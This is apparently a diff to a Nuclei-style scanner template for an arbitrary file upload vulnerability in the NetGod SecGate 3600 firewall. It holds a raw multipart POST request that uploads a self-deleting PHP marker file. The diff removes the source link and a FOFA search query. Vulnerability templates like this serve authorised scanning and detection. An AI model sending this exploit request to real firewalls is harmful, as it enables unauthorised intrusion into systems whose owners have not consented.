@@ -3,14 +3,8 @@ info:
   name: 网神 SecGate 3600 防火墙 app_av_import_save 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bgph3gisg0xxo5z0
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bgph3gisg0xxo5z0
-    fofa: title="网神SecGate 3600防火墙"
 http:
 - raw:
   - 'POST / HTTP/1.1
@@ -25,14 +19,10 @@ http:
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
 
 
-
-
     ------WebKitFormBoundaryJpMyThWnAxbcBBQc
 
 
     Content-Disposition: form-data; name="MAX_FILE_SIZE"
-
-
 
 
     10000000
@@ -47,8 +37,6 @@ http:
     Content-Type: text/plain
 
 
-
-
     <?php echo(md5(13123));unlink(__FILE__);?>
 
 
@@ -56,8 +44,6 @@ http:
 
 
     Content-Disposition: form-data; name="submit_post"
-
-
 
 
     app_av_import_save
